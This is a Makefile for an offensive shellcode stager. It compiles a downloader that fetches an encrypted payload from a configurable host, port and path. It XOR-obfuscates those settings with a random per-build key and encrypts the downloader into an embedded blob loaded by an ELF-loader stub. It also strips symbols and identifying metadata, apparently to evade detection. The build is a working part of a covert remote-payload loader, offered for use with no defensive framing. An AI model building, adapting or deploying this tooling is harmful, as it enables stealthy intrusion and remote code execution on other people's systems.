CC = gcc
# Add -ffunction-sections -fdata-sections
CFLAGS = -Wall -Wextra -Os -fno-builtin -fno-stack-protector -fPIC -nostdlib -I. \
         -fno-toplevel-reorder -s -fno-ident -ffunction-sections -fdata-sections \
         -fno-asynchronous-unwind-tables

# Debug support
ifdef DEBUG
CFLAGS += -DDEBUG
endif

# Add -Wl,--gc-sections
LDFLAGS = -nostdlib -static -Wl,-Ttext-segment=0x10000000 -s -Wl,--gc-sections -Wl,-N
DL_LDFLAGS = -nostdlib -static -fPIC -Wl,-Ttext-segment=0x0 -s -Wl,--gc-sections -Wl,-N

# Default configuration (can be overridden by environment variables)
DOWNLOAD_HOST ?= 127.0.0.1
DOWNLOAD_PORT ?= 8080
DOWNLOAD_PATH ?= /payload
DOWNLOAD_KEY ?= secret
LISTENER_TYPE ?= HTTP
MODULE_PATH ?= 
DOWNLOADER_MODULE_PATH ?= /lib/x86_64-linux-gnu/libdl.so.2

# Generate random XOR key per build
XOR_KEY_VALUE := $(shell python3 -c "import random; print(hex(random.randint(128, 255)))")

# XOR-encode config strings
XOR_HOST := $(shell python3 -c "s='$(DOWNLOAD_HOST)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_PORT := $(shell python3 -c "s='$(DOWNLOAD_PORT)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_PATH := $(shell python3 -c "s='$(DOWNLOAD_PATH)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_KEY := $(shell python3 -c "s='$(DOWNLOAD_KEY)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_MODULE_PATH := $(shell python3 -c "s='$(MODULE_PATH)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_LIB_PATH := $(shell python3 -c "s='$(DOWNLOADER_MODULE_PATH)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")

# Define listener type
CFLAGS += -DLISTENER_$(LISTENER_TYPE)

# Config options
CFLAGS += -DENCODED_HOST="$(XOR_HOST)"
CFLAGS += -DENCODED_PORT="$(XOR_PORT)"
CFLAGS += -DENCODED_PATH="$(XOR_PATH)"
CFLAGS += -DENCODED_KEY="$(XOR_KEY)"
CFLAGS += -DENCODED_MODULE_PATH="$(XOR_MODULE_PATH)"
CFLAGS += -DENCODED_LIB_PATH="$(XOR_LIB_PATH)"
CFLAGS += -DCONFIG_XOR_KEY=$(XOR_KEY_VALUE)

DL_SRCS = downloader.c net_utils.c aes.c tinflate.c utils.c
STUB_SRCS = stub.c elf_loader.c utils.c

DL_TARGET = downloader
DL_BIN = downloader.bin
DL_BLOB_H = downloader_blob.h

TARGET = stager
SHELLCODE = stager.bin

.PHONY: all clean

all: $(SHELLCODE)

$(DL_TARGET): $(DL_SRCS)
	$(CC) $(CFLAGS) $(DL_LDFLAGS) -o $@ $(DL_SRCS)

$(DL_BIN): $(DL_TARGET)
	objcopy -O binary -j .init -j .text -j .rodata -j .data $< $@

$(DL_BLOB_H): $(DL_BIN)
	@echo "Generating encrypted blob header..."
	@python3 -c "import os, random; \
	key = [random.randint(0, 255) for _ in range(16)]; \
	data = open('$(DL_BIN)', 'rb').read(); \
	enc_data = bytes([b ^ key[i % 16] for i, b in enumerate(data)]); \
	print('#ifndef DOWNLOADER_BLOB_H'); \
	print('#define DOWNLOADER_BLOB_H'); \
	print('static const unsigned char downloader_key[] = { ' + ', '.join(hex(b) for b in key) + ' };'); \
	print('static const unsigned int downloader_bin_len = ' + str(len(data)) + ';'); \
	print('static const unsigned char downloader_bin[] = { ' + ', '.join(hex(b) for b in enc_data) + ' };'); \
	print('#endif')" > $@

$(TARGET): $(STUB_SRCS) $(DL_BLOB_H)
	$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $(STUB_SRCS)

$(SHELLCODE): $(TARGET)
	objcopy -O binary -j .init -j .text -j .rodata -j .data $(TARGET) $@
	@echo "Shellcode generated at $(PWD)/$@"
	@wc -c $@

clean:
	rm -f $(TARGET) $(SHELLCODE) $(DL_TARGET) $(DL_BIN) $(DL_BLOB_H)
